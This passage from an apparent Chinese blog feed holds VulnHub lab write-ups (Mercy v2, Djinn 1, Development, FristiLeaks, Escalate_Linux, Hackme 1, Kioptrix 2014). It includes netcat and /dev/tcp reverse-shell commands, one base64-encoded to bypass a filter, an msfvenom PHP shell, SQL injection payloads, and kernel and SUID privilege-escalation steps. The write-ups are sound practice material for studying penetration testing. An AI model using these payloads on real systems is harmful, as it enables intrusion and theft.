<p>在home目录内发现能以root权限运行的程序timeclock，并且我具有W修改权限，观察<code>192.168.1.209/time</code>，这个文件应该是cron job，</p>
<p><img src="/images/Mercyv2/17.jpg" alt="17"></p>
<p>我追加了下面这条语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;rm -rf &#x2F;tmp&#x2F;f;mknod &#x2F;tmp&#x2F;f p;&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;f | nc 192.168.1.3 5555 1&gt;&#x2F;tmp&#x2F;f&quot; &gt;&gt; timeclock</span><br><span class="line">echo &quot;....&quot; &gt;&gt; XX 				&#x2F;&#x2F;追加</span><br><span class="line">rm &#x2F;tmp&#x2F;f						&#x2F;&#x2F;删除，因为是定时任务</span><br><span class="line">mknod &#x2F;tmp&#x2F;f p					&#x2F;&#x2F;创建管道f		mkfifo创建也可以</span><br><span class="line">&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;f					&#x2F;&#x2F;将shell的输入重定向到管道f</span><br><span class="line">nc 192.168.1.3 5555 1&gt;&#x2F;tmp&#x2F;f		&#x2F;&#x2F;连接目标IP端口，将shell的输出重定向管道中</span><br></pre></td></tr></table></figure>

<p><img src="/images/Mercyv2/16.jpg" alt="16"></p>
<p>等待程序执行，即可获取root shell</p>
<p><img src="/images/Mercyv2/18.jpg" alt="18"></p>
<h3 id="脏牛"><a href="#脏牛" class="headerlink" title="脏牛"></a>脏牛</h3><p><img src="/images/Mercyv2/19.jpg" alt="19"></p>
<p>内核4.4.0，还是i686，可以使用脏牛</p>
<p>这里有坑，目标机器上没有gcc，且我在64位上编译到目标机器上执行会报错，在32位下编译可以解决这个问题</p>
<p><img src="/images/Mercyv2/20.jpg" alt="20"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Djinn 1</title>
    <url>/2020/09/20/%E9%9D%B6%E5%9C%BADjinn-1/</url>
    <content><![CDATA[<h1 id="Djinn-1"><a href="#Djinn-1" class="headerlink" title="Djinn 1"></a>Djinn 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.250</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.250 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.250 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Djinn-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>7331端口进行目录扫描</p>
<p>发现/wish目录</p>
<p><img src="/images/Djinn-1/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>看样子是一个命令注入的漏洞，使用burp看看情况</p>
<p>输入命令whoami，发现了回显竟然在location</p>
<p><img src="/images/Djinn-1/3.png" alt="3"></p>
<p>跟着跳转也没什么大的发现</p>
<p>接着输入命令cat /etc/passwd，回显显示命令失败</p>
<p><img src="/images/Djinn-1/4.png" alt="4"></p>
<p>看来有一定的限制需要进行绕过，通过上一步，我们可以推断也许过滤<code>/</code>或者<code>空格</code><br>我们使用echo命令进行测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Djinn-1/5.png" alt="5"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#x2F;1</span><br></pre></td></tr></table></figure>

<p><img src="/images/Djinn-1/6.png" alt="6"></p>
<p>看来空格允许，但是<code>/</code>不可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo .</span><br></pre></td></tr></table></figure>

<p><img src="/images/Djinn-1/7.png" alt="7"></p>
<p><code>.</code>也不可以</p>
<p><img src="/images/Djinn-1/8.png" alt="8"></p>
<p><code>=</code>可以，<code>%</code>可以</p>
<p><img src="/images/Djinn-1/9.png" alt="9"></p>
<p><code>|</code>可以</p>
<p>可以确认/也不可以 .也不可以，可以用base64绕过<br>我们会使用到之前验证的|，空格，=号(也许)，%</p>
<p>base64编码payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;443 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>

<p>接着解码调用bash执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMjAxLzQ0MyAwPiYxIg&#x3D;&#x3D; |base64 -d |bash</span><br></pre></td></tr></table></figure>

<p>对其进行url编码发送过去<br>这样就拿到了shell</p>
<p><img src="/images/Djinn-1/10.png" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>拿到shell之后，就在/opt/80目录<br>linpeas扫描发现了这个目录可写</p>
<p><img src="/images/Djinn-1/11.png" alt="11"></p>
<p>查看这个目录下的文件</p>
<p><img src="/images/Djinn-1/12.png" alt="12"></p>
<p>发现了凭证文件</p>
<p><img src="/images/Djinn-1/13.png" alt="13"></p>
<p>切换过去</p>
<p><img src="/images/Djinn-1/14.png" alt="14"></p>
<p>之后发现能sudo以sam执行genie，不知道这个程序是干嘛的，执行看看</p>
<p><img src="/images/Djinn-1/15.png" alt="15"></p>
<p>-h发现了它似乎有执行命令的参数，尝试切换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u sam &#x2F;usr&#x2F;bin&#x2F;genie -e bash</span><br></pre></td></tr></table></figure>

<p>但是失败了，尝试man看一看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">man genie</span><br></pre></td></tr></table></figure>

<p><img src="/images/Djinn-1/16.png" alt="16"></p>
<p>尝试别的执行命令的方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo -u sam &#x2F;usr&#x2F;bin&#x2F;genie -cmd bash		&#x2F;&#x2F;失败</span><br><span class="line">sudo -u sam &#x2F;usr&#x2F;bin&#x2F;genie -cmd sh			&#x2F;&#x2F;失败</span><br><span class="line">sudo -u sam &#x2F;usr&#x2F;bin&#x2F;genie -cmd id			&#x2F;&#x2F;成功</span><br></pre></td></tr></table></figure>

<p><img src="/images/Djinn-1/17.png" alt="17"></p>
<p>接下来更坑，发现了sudo执行的程序</p>
<p><img src="/images/Djinn-1/18.png" alt="18"></p>
<p>又不知道是干嘛的，接着在当前用户的home目录发现了奇怪的文件</p>
<p><img src="/images/Djinn-1/19.png" alt="19"></p>
<p>传送到kali，需要将pyc转换成py，使用uncompyle2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;wibiti&#x2F;uncompyle2</span><br><span class="line">cd uncompyle2</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uncompyle2 a.pyc -o origin.py</span><br></pre></td></tr></table></figure>

<p>之后读它源码</p>
<p><img src="/images/Djinn-1/20.png" alt="20"></p>
<p>这题命令注入的绕过还挺有意思，后面就….</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Digitalworld.local(Development)</title>
    <url>/2020/05/25/%E9%9D%B6%E5%9C%BADigitalworld-local-Development/</url>
    <content><![CDATA[<h1 id="Digitalworld-local-Development"><a href="#Digitalworld-local-Development" class="headerlink" title="Digitalworld.local(Development)"></a>Digitalworld.local(Development)</h1><p>Kali:192.168.1.3</p>
<p>靶场:192.168.1.233</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Development/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问8080端口运行的web服务</p>
<p><img src="/images/Development/2.jpg" alt="2"></p>
<p>发现一个页面， 提示去查看<code>html_pages</code></p>
<p><img src="/images/Development/3.jpg" alt="3"></p>
<p>根据之前的提示，应该要去访问<code>development.html</code></p>
<p><img src="/images/Development/4.jpg" alt="4"></p>
<p>接着又提示访问<code>developmentsecretpage</code></p>
<p>最后来到下面的登录框</p>
<p><img src="/images/Development/5.jpg" alt="5"></p>
<p>随便输入一些内容，最终跳到了下面的页面</p>
<p><img src="/images/Development/6.jpg" alt="6"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="exploitDB"><a href="#exploitDB" class="headerlink" title="exploitDB"></a>exploitDB</h3><p>页面比较有用的提示是<code>slogin_lib.inc.php</code></p>
<p>我在<a href="https://www.exploit-db.com/exploits/7444">exploitDB</a>中找到了相关漏洞</p>
<p><img src="/images/Development/7.jpg" alt="7"></p>
<p>它会在<code>slog_users.txt</code>中存放一个明文用户名和未加盐的hash密码</p>
<p><img src="/images/Development/8.jpg" alt="8"></p>
<p>使用hashcat破解md5</p>
<p><img src="/images/Development/9.png" alt="9"></p>
<p>破解出了三个密码</p>
<p>尝试进行ssh，用户intern是可以建立连接的，不过是个rbash</p>
<p><img src="/images/Development/10.jpg" alt="10"></p>
<h3 id="shell逃逸"><a href="#shell逃逸" class="headerlink" title="shell逃逸"></a>shell逃逸</h3><p>既然有echo，就可以尝试python来逃逸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo os.system(&quot;&#x2F;bin&#x2F;bash&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Development/11.jpg" alt="11"></p>
<p>逃逸成功</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>内核版本为4.15</p>
<p><img src="/images/Development/12.jpg" alt="12"></p>
<p>搜索公开漏洞，发现可以使用<a href="https://github.com/bcoles/kernel-exploits">CVE-2018-18955</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;bcoles&#x2F;kernel-exploits.git</span><br><span class="line">cd kernel-exploits&#x2F;CVE-2018-18955&#x2F; </span><br><span class="line">gcc subuid_shell.c -o exp</span><br><span class="line">.&#x2F;exp</span><br><span class="line">gcc subshell.c -o subshell</span><br><span class="line">.&#x2F;subshell</span><br><span class="line">.&#x2F;exp</span><br></pre></td></tr></table></figure>

<p><img src="/images/Development/15.jpg" alt="15"></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p><code>/etc/passwd</code>发现，patrick也拥有bash shell，不过之前ssh连接不上</p>
<p>尝试使用su切换用户，成功用patrick登录</p>
<p><img src="/images/Development/17.jpg" alt="17"></p>
<p>而且该账户可以使用root权限使用vim和nano这样的文本编辑器</p>
<p>那就代表可以修改<code>/etc/passwd</code>这样存放敏感信息的文件进行提权</p>
<p>也可以运行vim输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>直接获取root bash</p>
<p><img src="/images/Development/18.jpg" alt="18"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场FristiLeaks 1.3</title>
    <url>/2020/05/29/%E9%9D%B6%E5%9C%BAFristiLeaks-1-3/</url>
    <content><![CDATA[<h1 id="FristiLeaks"><a href="#FristiLeaks" class="headerlink" title="FristiLeaks"></a>FristiLeaks</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.221</p>
<p>安装前要修改MAC:<code>08:00:27:A5:A6:76</code></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/FristiLeaks/1.jpg" alt="1"></p>
<p>只开放了80端口</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>只开放了80端口，通过Nmap已经发现了robots.txt</p>
<p><img src="/images/FristiLeaks/2.jpg" alt="2"></p>
<p>不过三个目录都没有任何发现</p>
<p>接下来我进行了目录枚举</p>
<p><img src="/images/FristiLeaks/3.jpg" alt="3"></p>
<p>发现了一个目录</p>
<p><img src="/images/FristiLeaks/4.jpg" alt="4"></p>
<p>keep-calm.png指向一个张图片</p>
<p><img src="/images/FristiLeaks/5.jpg" alt="5"></p>
<p>根据图片猜测目录<code>/fristi</code></p>
<p><img src="/images/FristiLeaks/6.jpg" alt="6"></p>
<p>查看网页代码，发现了一些有趣的信息</p>
<p><img src="/images/FristiLeaks/7.jpg" alt="7"></p>
<p>这是一段base64信息，进行解码</p>
<p><img src="/images/FristiLeaks/8.jpg" alt="8"></p>
<p>发现是一个PNG，将它还原</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64 -d 1.txt &gt; 1.png</span><br></pre></td></tr></table></figure>

<p><img src="/images/FristiLeaks/9.jpg" alt="9"></p>
<p>根据源代码提示的用户名，我们可以得出账号密码</p>
<p>eezeepz/keKkeKKeKKeKkEkkEk</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p><img src="/images/FristiLeaks/10.jpg" alt="10"></p>
<p>登录成功后，是一个上传页面<br>尝试上传木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;reverse_php LHOST&#x3D;192.168.1.3 LPORT&#x3D;4444 -f raw -o evil.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/FristiLeaks/11.jpg" alt="11"></p>
<p>失败，对文件格式有限制，尝试修改后缀名绕过<code>evil.php.jpg</code></p>
<p><img src="/images/FristiLeaks/12.jpg" alt="12"></p>
<p>成功绕过，获得了低权限的shell</p>
<p><img src="/images/FristiLeaks/12.jpg" alt="12"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Escalate_Linux: 1</title>
    <url>/2020/09/19/%E9%9D%B6%E5%9C%BAEscalate-Linux-1/</url>
    <content><![CDATA[<h1 id="Escalate-Linux-1"><a href="#Escalate-Linux-1" class="headerlink" title="Escalate_Linux 1"></a>Escalate_Linux 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.232</p>
<p>这台机器专门练习linux提权</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.232 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.232 -oN nmap</span><br></pre></td></tr></table></figure>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>NFS枚举</p>
<p><img src="/images/Escalate-Linux-1/2.png" alt="2"></p>
<p>这里的reverse_shell在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.232&#x2F;shell.php?cmd&#x3D;</span><br></pre></td></tr></table></figure>

<p>初始shell为user6</p>
<p><img src="/images/Escalate-Linux-1/3.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="1-SUID"><a href="#1-SUID" class="headerlink" title="1 SUID"></a>1 SUID</h3><p><img src="/images/Escalate-Linux-1/4.png" alt="4"></p>
<p>发下了两个SUID，其中/home/user3/shell可以直接获取root</p>
<p><img src="/images/Escalate-Linux-1/5.png" alt="5"></p>
<p>/home/user5/script</p>
<p><img src="/images/Escalate-Linux-1/6.png" alt="6"></p>
<p>初步猜测执行了ls命令，而且SUID的权限是root</p>
<p><img src="/images/Escalate-Linux-1/7.png" alt="7"></p>
<p>传回本地分析，可以基本确认它通过PATH调用了ls<br>可以通过环境变量进行提权</p>
<p><img src="/images/Escalate-Linux-1/8.png" alt="8"></p>
<h3 id="2-cronjob"><a href="#2-cronjob" class="headerlink" title="2 cronjob"></a>2 cronjob</h3><p>/etc/crontab发现了计划任务，5分钟执行一次</p>
<p><img src="/images/Escalate-Linux-1/9.png" alt="9"></p>
<p>但只有user4可以修改，如果我们切换到他，修改shell脚本的内容，我们就可以提权</p>
<p><img src="/images/Escalate-Linux-1/10.png" alt="10"></p>
<h3 id="3-NFS"><a href="#3-NFS" class="headerlink" title="3 NFS"></a>3 NFS</h3><p><img src="/images/Escalate-Linux-1/11.png" alt="11"></p>
<p>发现了no_root_suash<br>直接在kali挂载它</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -t nfs 192.168.1.232:&#x2F;home&#x2F;user5 &#x2F;tmp&#x2F;tmp&#x2F;</span><br></pre></td></tr></table></figure>

<p>在kali中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp &#x2F;bin&#x2F;sh evil</span><br><span class="line">chown root:root evil</span><br><span class="line">chmod u+s evil</span><br></pre></td></tr></table></figure>

<p>在目标中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;evil -p</span><br></pre></td></tr></table></figure>

<p><img src="/images/Escalate-Linux-1/12.png" alt="12"></p>
<h3 id="4-mysql"><a href="#4-mysql" class="headerlink" title="4 mysql"></a>4 mysql</h3><p><img src="/images/Escalate-Linux-1/13.png" alt="13"></p>
<p>linpeas发现了mysql默认的连接凭据root/root可以登录</p>
<p>枚举/etc/passwd发现mysql用户具有/bin/bash<br>数据库内又存放mysql的密码，直接切换过去</p>
<p><img src="/images/Escalate-Linux-1/14.png" alt="14"></p>
<p>之后在/var/mysql里寻找信息</p>
<p><img src="/images/Escalate-Linux-1/15.png" alt="15"></p>
<p>发现了.user_informations</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 .user_informations</span><br></pre></td></tr></table></figure>

<p>里面存有普通用户的密码</p>
<p>之后再在/etc/mysql里寻找，发现了secret.cnf，存放有root的密码</p>
<p><img src="/images/Escalate-Linux-1/16.png" alt="16"></p>
<p>其他方法没啥意思，检查检查各自的SUID和sudo就行了</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Hackme 1</title>
    <url>/2020/09/17/%E9%9D%B6%E5%9C%BAHackme-1/</url>
    <content><![CDATA[<h1 id="Hackme-1"><a href="#Hackme-1" class="headerlink" title="Hackme 1"></a>Hackme 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.243</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.211 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.211 -oN nmap</span><br></pre></td></tr></table></figure>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动访问80端口</p>
<p><img src="/images/Hackme-1/2.png" alt="2"></p>
<p>尝试sql注入失败，发现有注册功能，注册一个账号evil/password123</p>
<p>之后跳转到一个书籍的搜索页面</p>
<p><img src="/images/Hackme-1/3.png" alt="3"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>这里我们可以尝试sql注入，尝试的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/4.png" alt="4"></p>
<p>成功发现了sql注入漏洞，看样子是存在回显的，我们可以针对它测试几种常见的注入方式</p>
<h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>确认字段数，这里为了确认字段数是否正确，我们需要页面产生一定的回显</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 order by 3#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/5.png" alt="5"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 order by 4#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/6.png" alt="6"></p>
<p>可以得到字段数为3，接着尝试union注入，比如尝试爆出对方的数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,schema_name from information_schema.schemata#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/7.png" alt="7"></p>
<p>webpphacking看起来有点意思，爆它的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;&quot;webapphacking&quot;#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/8.png" alt="8"></p>
<p>爆users表的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,column_name from information_schema.columns where table_schema&#x3D;&#39;webapphacking&#39; and table_name&#x3D;&#39;users&#39;#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/9.png" alt="9"></p>
<p>最后爆出数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select user,pasword,name from users#</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hackme-1/10.png" alt="10"></p>
<p>superadmin的账户名称看起来很显眼</p>
<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or sleep(if(length(database())&gt;2,1,0))#</span><br></pre></td></tr></table></figure>

<h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 and length(database())&gt;7#</span><br></pre></td></tr></table></figure>



<p>破解md5</p>
<p><img src="/images/Hackme-1/11.png" alt="11"></p>
<p>所以凭据为<code>superadmin/Uncrackable</code></p>
<p><img src="/images/Hackme-1/12.png" alt="12"></p>
<p>登录进去后，我们应该有一个后台的文件上传<br>虽然这里要求上传一个Image，但是没有做任何过滤，我们直接上传php的shell</p>
<p><img src="/images/Hackme-1/13.png" alt="13"></p>
<p>提示路径在<code>/uploads/</code>下</p>
<p><img src="/images/Hackme-1/14.png" alt="14"></p>
<p>直接获取shell</p>
<p><img src="/images/Hackme-1/15.png" alt="15"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现了普通用户hackme，但是mysql连接密码和存储的密码切不过去</p>
<p>看看www-data能不能提权</p>
<p><img src="/images/Hackme-1/16.png" alt="16"></p>
<p>SUID下发现了一个在home的文件<br>先执行看看是做什么的</p>
<p><img src="/images/Hackme-1/17.png" alt="17"></p>
<p>嗷，我懂了</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Kioptrix 2014</title>
    <url>/2020/05/23/%E9%9D%B6%E5%9C%BAKioptrix-2014/</url>
    <content><![CDATA[<h1 id="Kioptrix-2014"><a href="#Kioptrix-2014" class="headerlink" title="Kioptrix 2014"></a>Kioptrix 2014</h1><p>Kali:192.168.1.3</p>
<p>靶机:192.168.1.250</p>
<blockquote>
<p>Also, before powering on the VM I suggest you <strong>remove the network card and re-add it</strong>. For some oddball reason it doesn’t get its IP (well I do kinda know why but don’t want to give any details away). So just add the VM to your virtualization software, remove and then add a network card. Set it to bridge mode and you should be good to go.</p>
</blockquote>
<p>作者提示:如果扫描不到IP，删除并重新添加网卡，设置为桥接即可</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Kioptrix-2014/1.jpg" alt="1"></p>
<p> 开放了80、8080两个web端口</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Kioptrix-2014/2.jpg" alt="2"></p>
<p>8080打不开</p>
<p><img src="/images/Kioptrix-2014/3.jpg" alt="3"></p>
<p>80端口倒是可以打开，并找到了提示信息</p>
<p><img src="/images/Kioptrix-2014/4.jpg" alt="4"></p>
<p>根据提示信息，我们发现了<code>pchart 2.1.3</code></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p>搜寻当前应用公开漏洞</p>
<p><img src="/images/Kioptrix-2014/5.jpg" alt="5"></p>
<p>发现了文件包含漏洞，利用它可以收集更多信息</p>
<p>尝试利用该漏洞</p>
<p><img src="/images/Kioptrix-2014/6.jpg" alt="6"></p>
<p>利用成功，而且还得知了操作系统为FreeBSD<br>由于之前访问8080失败，所以我希望能够读取apache的配置文件<code>httpd.conf</code>查看规则</p>
<p>搜索找到Apache在FreeBSD上的默认路径(/usr/local/etc/apache2x/httpd.conf),根据得到的apache版本，x=2<br>尝试使用文件包含进行读取</p>
<p><img src="/images/Kioptrix-2014/7.jpg" alt="7"></p>
<p>顺利读取到了配置文件，原来限制了UA</p>
<p>修改UA</p>
<p><img src="/images/Kioptrix-2014/10.jpg" alt="10"></p>
<p>访问8080端口</p>
<p><img src="/images/Kioptrix-2014/9.jpg" alt="9"></p>
<p>这次成功了，并且得到了正在运行的web应用<code>phptax</code><br>搜索公开漏洞，找到了msf里可以使用的RCE</p>
<p><img src="/images/Kioptrix-2014/11.jpg" alt="11"></p>
<p>使用msf进行攻击</p>
<p><img src="/images/Kioptrix-2014/12.jpg" alt="12"></p>
<p>成功</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>根据收集的系统信息，查找FreeBSD 9.0的提权exp</p>
<p><img src="/images/Kioptrix-2014/13.jpg" alt="13"></p>
<p>传输提权脚本，这次系统没有wget，我们使用nc进行传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击者</span><br><span class="line">nc -lvp 4444 &lt; exp.c</span><br><span class="line">受害者</span><br><span class="line">nc -nv 192.168.1.3 4444 &gt; exp.c</span><br></pre></td></tr></table></figure>

<p>之后编译执行</p>
<p><img src="/images/Kioptrix-2014/14.jpg" alt="14"></p>
<p>成功获取root权限</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场HackLAB</title>
    <url>/2020/09/13/%E9%9D%B6%E5%9C%BAHackLAB/</url>
    <content><![CDATA[<h1 id="HackLab"><a href="#HackLab" class="headerlink" title="HackLab"></a>HackLab</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>kali:192.168.1.201</p>
<p>目标:192.168.1.205</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.205 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.205 -oN nmap</span><br></pre></td></tr></table></figure>

